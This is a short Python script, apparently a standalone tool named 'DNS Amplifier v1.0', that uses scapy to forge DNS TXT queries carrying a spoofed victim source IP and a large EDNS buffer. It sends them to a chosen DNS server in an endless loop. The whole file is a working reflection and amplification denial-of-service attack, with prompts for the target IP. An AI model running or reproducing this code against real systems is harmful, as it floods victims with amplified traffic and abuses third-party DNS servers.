from scapy.all import *
import sys
 
def constructDNSPacket(dest_ip, source_ip, query):
    packet = IP(dst=dest_ip,src=source_ip)/UDP()/DNS(rd=1,ad=1,qd=DNSQR(qname=query,qtype="TXT"),ar=DNSRROPT(rclass=3000))
    return packet
 
def getParameters():
    #src_mac = input("Enter target MAC address: ")
    dest_ip = input("Enter DNS server IP: ")
    source_ip = input("Enter source (target) IP: ")
    query = input("Enter TXT record domain to query for attack: ")
    return dest_ip, source_ip, query
 
print("DNS Amplifier v1.0 by Joshua Gregory")
dest_ip, source_ip, query = getParameters()
packet = constructDNSPacket(dest_ip, source_ip, query)
print("Beginning attack")
s = conf.L3socket(iface='eth0')
while(1):
    s.send(packet)